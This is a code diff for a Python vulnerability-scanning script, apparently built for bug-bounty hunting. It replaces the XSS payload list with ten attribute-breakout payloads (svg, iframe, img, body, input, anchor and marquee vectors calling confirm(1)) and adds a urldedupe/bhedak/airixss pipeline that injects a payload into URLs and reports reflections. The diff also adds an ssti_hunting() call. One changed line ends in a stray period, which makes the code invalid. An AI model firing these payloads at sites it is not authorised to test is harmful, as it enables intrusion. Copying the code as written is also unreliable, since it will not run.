@@ -259,12 +259,18 @@ def xss_hunting():
     print(f"{Fore.YELLOW}Hunting for XSS vulnerabilities...{Style.RESET_ALL}")
     logging.info("Hunting for XSS vulnerabilities.")
     
+    # XSS payloads in the specific format
     xss_payloads = [
-        "<script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        "'\"--><svg/onload=alert(1)>",
-        "' OR '1'='1"
+        '\"><svg onload=confirm(1)>',  # Basic payload
+        '\"><svg/onload=confirm(1)>',  # Variant with no space after svg
+        '\'><svg onload=confirm(1)>',  # Variant with single quote at the beginning
+        '"><svg onload=confirm(String.fromCharCode(88,83,83))>',  # Using String.fromCharCode
+        '\"><iframe src=javascript:confirm(1)>',  # Using an iframe with JS
+        '\"><img src=x onerror=confirm(1)>',  # Using img tag with onerror
+        '\"><body onload=confirm(1)>',  # Body tag onload event
+        '\"><input onfocus=confirm(1) autofocus>',  # Input field with autofocus and onfocus
+        '\"><a href="javascript:confirm(1)">Click me</a>',  # Anchor tag with JavaScript
+        '\"><marquee onstart=confirm(1)>Test</marquee>',  # Using marquee tag
     ]
     
     print(f"{Fore.CYAN}Performing XSS hunting with the following payloads:{Style.RESET_ALL}")
@@ -272,9 +278,22 @@ def xss_hunting():
         print(f"{Fore.YELLOW}{payload}{Style.RESET_ALL}")
         logging.info(f"Testing payload: {payload}")
     
+    # Running the urldedupe, bhedak, and airixss command
+    print(f"{Fore.CYAN}Running URL deduplication and XSS detection tools...{Style.RESET_ALL}")
+    command = "urldedupe -qs | bhedak '\"><svg onload=confirm(1)>' | airixss -payload \"confirm(1)\" | egrep -v 'Not'"
+    result = run_command(command)
+    
+    if result:
+        print(f"{Fore.GREEN}Potential XSS vulnerabilities found:{Style.RESET_ALL}")
+        print(result)
+        logging.info("Potential XSS vulnerabilities found:")
+        logging.info(result)
+    else:
+        print(f"{Fore.GREEN}No XSS vulnerabilities found or all were filtered out.{Style.RESET_ALL}")
+        logging.info("No XSS vulnerabilities found or all were filtered out.")
+    
     print(f"{Fore.GREEN}XSS hunting complete.{Style.RESET_ALL}")
-    logging.info("XSS hunting complete.")
-    # Save the payloads and test results as needed.
+    logging.info("XSS hunting complete.").
 
 def main():
     # Ensure the necessary tools are available
@@ -294,6 +313,7 @@ def main():
     open_redirect_scanning()
     xss_hunting()
     sqli_hunting()
+    ssti_hunting()
 
 if __name__ == "__main__":
     main()
